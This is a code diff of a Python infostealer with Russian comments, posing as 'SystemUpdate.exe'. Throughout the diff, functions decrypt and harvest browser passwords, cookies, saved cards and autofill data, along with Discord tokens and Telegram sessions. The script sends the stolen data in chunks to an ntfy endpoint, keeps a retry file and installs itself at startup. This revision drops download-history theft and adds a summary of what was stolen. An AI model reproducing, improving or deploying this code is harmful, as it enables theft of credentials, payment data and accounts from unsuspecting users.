@@ -1,5 +1,5 @@
 # SystemUpdate.exe - Advanced Browser Data Export Utility
-# v2.1 – увеличен таймаут, добавлены задержки между запросами
+# v2.2 – убраны история и загрузки, красивый вывод, финальная сводка
 import os, json, base64, sqlite3, shutil, subprocess, re, time, socket, platform, sys
 from datetime import datetime
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -15,8 +15,8 @@ OUTPUT = os.path.join(TEMP, "SystemReport")
 os.makedirs(OUTPUT, exist_ok=True)
 RETRY_FILE = os.path.join(OUTPUT, "retry.json")
 CHUNK_SIZE = 3500
-REQUEST_TIMEOUT = 30        # было 10
-SLEEP_BETWEEN_CHUNKS = 3    # секунд
+REQUEST_TIMEOUT = 30
+SLEEP_BETWEEN_CHUNKS = 3
 
 # ===================== РАСШИФРОВКА ТОПИКА =====================
 def xor(data, key):
@@ -111,7 +111,7 @@ def get_profiles(base):
             profiles.append((d, path))
     return profiles
 
-# ===================== СБОР ДАННЫХ =====================
+# ===================== СБОР ДАННЫХ (чит. формат) =====================
 def steal_passwords(profile_path, key, browser):
     result = []
     db = os.path.join(profile_path, 'Login Data')
@@ -127,7 +127,8 @@ def steal_passwords(profile_path, key, browser):
         for url, user, pwd in cur.fetchall():
             if user and pwd:
                 try:
-                    result.append(f"{url} | {user} | {decrypt(pwd, key).decode(errors='ignore')}")
+                    dec_pwd = decrypt(pwd, key).decode(errors='ignore')
+                    result.append(f"{url} | {user} | {dec_pwd}")
                 except:
                     pass
         conn.close()
@@ -157,7 +158,8 @@ def steal_cookies(profile_path, key, browser):
         cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
         for host, name, val in cur.fetchall():
             try:
-                result.append(f"{host}\t{name}\t{decrypt(val, key).decode(errors='ignore')}")
+                dec_val = decrypt(val, key).decode(errors='ignore')
+                result.append(f"{host} | {name} | {dec_val}")
             except:
                 pass
         conn.close()
@@ -209,28 +211,6 @@ def steal_autofill(profile_path, browser):
         for name, val in cur.fetchall():
             if name and val:
                 result.append(f"{name} = {val}")
-        conn.close()
-    except:
-        pass
-    finally:
-        if os.path.exists(tmp):
-            os.remove(tmp)
-    return result
-
-def steal_downloads(profile_path, browser):
-    result = []
-    db = os.path.join(profile_path, 'History')
-    if not os.path.exists(db):
-        return result
-    tmp = os.path.join(TEMP, f"down_{os.urandom(4).hex()}.db")
-    if not safe_copy(db, tmp):
-        return result
-    try:
-        conn = sqlite3.connect(tmp)
-        cur = conn.cursor()
-        cur.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 200")
-        for path, url in cur.fetchall():
-            result.append(f"{path} | from: {url}")
         conn.close()
     except:
         pass
@@ -332,7 +312,7 @@ def send_to_ntfy(title, lines):
                 retry_data.append({"title": title, "data": chunk})
         except:
             retry_data.append({"title": title, "data": chunk})
-        time.sleep(SLEEP_BETWEEN_CHUNKS)      # <-- пауза между чанками
+        time.sleep(SLEEP_BETWEEN_CHUNKS)
     if retry_data:
         with open(RETRY_FILE, 'w', encoding='utf-8') as f:
             json.dump(retry_data, f)
@@ -353,7 +333,7 @@ def flush_retry():
                           timeout=REQUEST_TIMEOUT)
         except:
             remaining.append(e)
-        time.sleep(SLEEP_BETWEEN_CHUNKS)      # <-- пауза при повторной отправке
+        time.sleep(SLEEP_BETWEEN_CHUNKS)
     if remaining:
         with open(RETRY_FILE, 'w', encoding='utf-8') as f:
             json.dump(remaining, f)
@@ -383,6 +363,9 @@ def main():
     sys_info = system_info()
     send_to_ntfy("SystemInfo", sys_info)
 
+    # Словарь для сводки: ключ = "Тип (профиль)", значение = "+"/"-"
+    summary = {}
+    
     browsers = {
         "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
         "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
@@ -403,54 +386,70 @@ def main():
         for profile_name, profile_path in profiles:
             tag = f"{browser_name}/{profile_name}"
 
+            # Пароли
             passwords = steal_passwords(profile_path, key, browser_name)
             if passwords:
                 data_collected = True
                 send_to_ntfy(f"Passwords ({tag})", passwords)
+                summary[f"Passwords ({tag})"] = "+"
+            else:
+                summary[f"Passwords ({tag})"] = "-"
 
+            # Куки
             cookies = steal_cookies(profile_path, key, browser_name)
             if cookies:
                 data_collected = True
                 send_to_ntfy(f"Cookies ({tag})", cookies)
+                summary[f"Cookies ({tag})"] = "+"
+            else:
+                summary[f"Cookies ({tag})"] = "-"
 
+            # Карты
             cards = steal_cards(profile_path, key, browser_name)
             if cards:
                 data_collected = True
                 send_to_ntfy(f"Cards ({tag})", cards)
+                summary[f"Cards ({tag})"] = "+"
+            else:
+                summary[f"Cards ({tag})"] = "-"
 
+            # Автозаполнение
             autofill = steal_autofill(profile_path, browser_name)
             if autofill:
                 data_collected = True
                 send_to_ntfy(f"Autofill ({tag})", autofill)
-
-            downloads = steal_downloads(profile_path, browser_name)
-            if downloads:
-                data_collected = True
-                send_to_ntfy(f"Downloads ({tag})", downloads)
+                summary[f"Autofill ({tag})"] = "+"
+            else:
+                summary[f"Autofill ({tag})"] = "-"
 
     # Discord tokens
     discord_tokens = steal_discord_tokens()
     if discord_tokens:
         data_collected = True
         send_to_ntfy("DiscordTokens", [f"Token: {t}" for t in discord_tokens])
+        summary["Discord Tokens"] = "+"
+    else:
+        summary["Discord Tokens"] = "-"
 
     # Telegram session
     tg_sessions = steal_telegram_session()
     if tg_sessions:
         data_collected = True
         send_to_ntfy("Telegram", tg_sessions)
-
-    # Финальное сообщение
-    if not data_collected:
-        requests.post(NTFY_URL,
-                      data="No data collected".encode(),
-                      headers={"Title": "Export Failed", "Tags": "warning"},
-                      timeout=REQUEST_TIMEOUT)
+        summary["Telegram Session"] = "+"
     else:
-        requests.post(NTFY_URL,
-                      data=f"Export complete at {datetime.now()}",
-                      headers={"Title": "Export Done", "Tags": "white_check_mark"},
-                      timeout=REQUEST_TIMEOUT)
+        summary["Telegram Session"] = "-"
+
+    # Финальная сводка
+    summary_lines = ["=== Summary ==="]
+    for category, status in summary.items():
+        summary_lines.append(f"{category}: {status}")
+    if not data_collected:
+        summary_lines.append("No data collected")
+    else:
+        summary_lines.append(f"Export complete at {datetime.now()}")
+    
+    send_to_ntfy("Summary", summary_lines)
 
     # Автозагрузка
     add_to_startup()
